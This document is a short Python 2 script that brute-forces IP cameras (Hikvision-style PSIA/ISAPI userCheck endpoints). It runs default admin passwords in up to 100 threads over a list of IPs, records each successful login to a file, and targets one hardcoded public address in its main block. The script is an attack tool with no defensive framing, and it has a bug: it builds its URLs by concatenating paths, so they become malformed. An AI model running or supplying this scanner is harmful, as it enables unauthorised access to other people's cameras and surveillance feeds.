import base64
import requests
from threading import *

users = ('admin:123456','admin:12345','admin:abc12345','admin:admin123')
urls = ( '/PSIA/Custom/SelfExt/userCheck', '/ISAPI/Security/userCheck', '/PSIA/Custom/HIK/userCheck')

fp = open('1.txt','r')
fp1 = open('ip.txt','w')

def scan(ip):
    print ip
    ip = ip.strip('\n')
    site = "http://" + ip
    for url in urls:
        site = site + url
        for user in users:
            user_pass = 'Basic ' + base64.b64encode(user)
            headers = {'Authorization': user_pass}
            try:
                r = requests.get(site, headers=headers)
                if '200' in str(r):
                    print site, user, r.text
                    if '200' in r.text:
                        fp1.write(ip + ' ' + user + '\n')
            except:
                return 0

def main():
    sites = fp.readlines()
    threads = 100
    for ip in sites:
        while(True):
            if activeCount() <= threads:
                Thread(target=scan,args=(ip,)).start()
                break
            else:
                continue
    while(True):
        if activeCount() < 2:
            return 1

if __name__ == '__main__':
    ip = '202.199.233.29'
    scan(ip)
